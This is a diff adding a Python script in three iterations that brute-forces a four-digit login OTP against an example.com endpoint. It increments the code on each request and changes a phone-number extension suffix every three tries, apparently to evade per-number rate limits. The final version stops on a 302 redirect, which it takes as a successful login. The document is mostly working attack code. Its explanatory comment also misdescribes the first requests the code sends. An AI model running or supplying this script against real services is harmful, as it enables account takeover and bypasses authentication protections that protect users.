@@ -1,0 +1,110 @@
+import requests
+
+def send_request():
+    url = 'http://example.com/login'
+    phone_number = "+380931111111;ext=1"
+    otp = '0000'
+
+    counter = 0
+
+    while True:
+        if counter % 3 == 0:
+            ext_index = phone_number.find('ext=')
+            ext = int(phone_number[ext_index+4:])
+            ext += 1
+            phone_number = phone_number[:ext_index] + f'ext={ext}'
+
+        otp = str(int(otp) + 1).zfill(4)
+
+        data = {'number': phone_number, 'otp': otp}
+        response = requests.post(url, json=data)
+
+        counter += 1
+
+if __name__ == '__main__':
+    send_request()
+
+
+#
+#For example, the first request might look something like this:
+#
+#{
+#  "number": "+380931111111;ext=1",
+#  "otp": "0000"
+#}
+#
+#The second request might look like this:
+#
+#{
+#  "number": "+380931111111;ext=1",
+#  "otp": "0001"
+#}
+#And so on. 
+#The extension number in the phone number will be incremented every three requests, while the OTP parameter will be incremented by 1 every request.
+#
+#
+#
+
+
+###
+import requests
+
+def send_request(phone_number, otp):
+    url = 'http://example.com/login'
+
+    data = {'number': phone_number, 'otp': otp}
+    response = requests.post(url, json=data)
+
+if __name__ == '__main__':
+    counter = 0
+    phone_number = "+380931111111;ext=1"
+    otp = '0000'
+
+    while True:
+        if counter % 3 == 0:
+            ext_index = phone_number.find('ext=')
+            ext = int(phone_number[ext_index+4:])
+            ext += 1
+            phone_number = phone_number[:ext_index] + f'ext={ext}'
+
+        otp = str(int(otp) + 1).zfill(4)
+
+        send_request(phone_number, otp)
+        counter += 1
+###
+
+import requests
+
+def send_request(phone_number, otp):
+    url = 'http://example.com/login'
+
+    data = {'number': phone_number, 'otp': otp}
+    response = requests.post(url, json=data)
+
+    # Check if the server returned a redirect status code
+    if response.status_code == 302:
+        # If it did, return a success message
+        return "Success!"
+
+if __name__ == '__main__':
+    counter = 0
+    phone_number = "+380931111111;ext=1"
+    otp = '0000'
+
+    while True:
+        if counter % 3 == 0:
+            ext_index = phone_number.find('ext=')
+            ext = int(phone_number[ext_index+4:])
+            ext += 1
+            phone_number = phone_number[:ext_index] + f'ext={ext}'
+
+        otp = str(int(otp) + 1).zfill(4)
+
+        result = send_request(phone_number, otp)
+        if result == "Success!":
+            break
+
+        counter += 1
+
+###
+
